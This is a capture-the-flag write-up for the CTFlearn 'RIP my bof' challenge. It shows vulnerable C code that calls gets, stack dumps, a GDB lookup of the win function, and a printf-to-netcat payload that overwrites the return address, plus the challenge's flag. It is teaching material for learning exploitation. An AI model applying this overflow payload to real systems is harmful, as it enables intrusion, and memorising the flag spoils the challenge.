# RIP my bof
## Description
Okay so we have a bof, can we get it to redirect IP (instruction pointer) to something else?

If you get stuck liveoverflow [covers you again](https://old.liveoverflow.com/binary_hacking/protostar/stack3.html)!

`nc thekidofarcrania.com 4902`
## Hints
(None)
## Solution
1. The `gets` vulnerability is pointed out in the source code.
```c
void vuln() {
  char padding[16];
  char buff[32];

  memset(buff, 0, sizeof(buff)); // Zero-out the buffer.
  memset(padding, 0xFF, sizeof(padding)); // Mark the padding with 0xff.

  // Initializes the stack visualization. Don't worry about it!
  init_visualize(buff); 

  // Prints out the stack before modification
  visualize(buff);

  printf("Input some text: ");
  gets(buff); // This is a vulnerable call!

  // Prints out the stack after modification
  visualize(buff); 
}
```
2. Run the program and it's obvious we must overflow 60 bytes to then subsequently alter the return address.
```console
% nc thekidofarcrania.com 4902

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xffea1b40 | 00 00 00 00 00 00 00 00 |
0xffea1b48 | 00 00 00 00 00 00 00 00 |
0xffea1b50 | 00 00 00 00 00 00 00 00 |
0xffea1b58 | 00 00 00 00 00 00 00 00 |
0xffea1b60 | ff ff ff ff ff ff ff ff |
0xffea1b68 | ff ff ff ff ff ff ff ff |
0xffea1b70 | c0 75 f1 f7 00 a0 04 08 |
0xffea1b78 | 88 1b ea ff 8b 86 04 08 |
Return address: 0x0804868b

Input some text:
```
3. Using GDB, we can see that the address of `win` is `0x08048586`.
```console
% gdb -q server
Reading symbols from server...
(No debugging symbols found in server)
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080483a8  _init
0x080483e0  setbuf@plt
0x080483f0  printf@plt
0x08048400  gets@plt
0x08048410  puts@plt
0x08048420  system@plt
0x08048430  __libc_start_main@plt
0x08048440  memset@plt
0x08048450  sprintf@plt
0x08048460  __gmon_start__@plt
0x08048470  _start
0x080484b0  _dl_relocate_static_pie
0x080484c0  __x86.get_pc_thunk.bx
0x080484d0  deregister_tm_clones
0x08048510  register_tm_clones
0x08048550  __do_global_dtors_aux
0x08048580  frame_dummy
0x08048586  win
0x080485b1  vuln
0x08048640  main
0x0804869a  __x86.get_pc_thunk.ax
0x0804869e  init_visualize
0x080486e1  visualize
0x08048890  __libc_csu_init
0x080488f0  __libc_csu_fini
0x080488f4  _fini
```
4. Overflow the buffer to insert the return address for `win`.
```console
% printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x86\x85\x04\x08\n" | nc thekidofarcrania.com 4902

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xfff16320 | 00 00 00 00 00 00 00 00 |
0xfff16328 | 00 00 00 00 00 00 00 00 |
0xfff16330 | 00 00 00 00 00 00 00 00 |
0xfff16338 | 00 00 00 00 00 00 00 00 |
0xfff16340 | ff ff ff ff ff ff ff ff |
0xfff16348 | ff ff ff ff ff ff ff ff |
0xfff16350 | c0 e5 f3 f7 00 a0 04 08 |
0xfff16358 | 68 63 f1 ff 8b 86 04 08 |
Return address: 0x0804868b

Input some text: 
Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xfff16320 | 61 61 61 61 61 61 61 61 |
0xfff16328 | 61 61 61 61 61 61 61 61 |
0xfff16330 | 61 61 61 61 61 61 61 61 |
0xfff16338 | 61 61 61 61 61 61 61 61 |
0xfff16340 | 61 61 61 61 61 61 61 61 |
0xfff16348 | 61 61 61 61 61 61 61 61 |
0xfff16350 | 61 61 61 61 61 61 61 61 |
0xfff16358 | 61 61 61 61 86 85 04 08 |
Return address: 0x08048586

CTFlearn{c0ntr0ling_r1p_1s_n0t_t00_h4rd_abjkdlfa}
timeout: the monitored command dumped core
```
